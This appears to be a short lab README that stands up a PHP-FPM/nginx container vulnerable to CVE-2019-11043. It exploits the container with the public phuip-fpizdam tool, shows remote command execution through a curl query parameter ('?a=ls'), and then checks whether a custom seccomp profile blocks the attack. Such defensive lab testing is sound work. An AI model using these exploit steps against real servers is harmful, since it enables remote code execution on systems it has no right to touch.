
Container: nunolopes97/cve-2019-11043
Run: sudo docker run -it -p 8080:80 nunolopes97/cve-2019-11043

Exploit:
    Install: go get github.com/neex/phuip-fpizdam
    Run: ./phuip-fpizdam http://127.0.0.1:8080/script.php
    RCE: curl http://127.0.0.1:8080/script.php?a=ls
    

Use custom seccomp profile and check that exploit does not work
Run: sudo docker run -it --security-opt seccomp=./nginx.json -p 8080:80 nunolopes97/cve-2019-11043
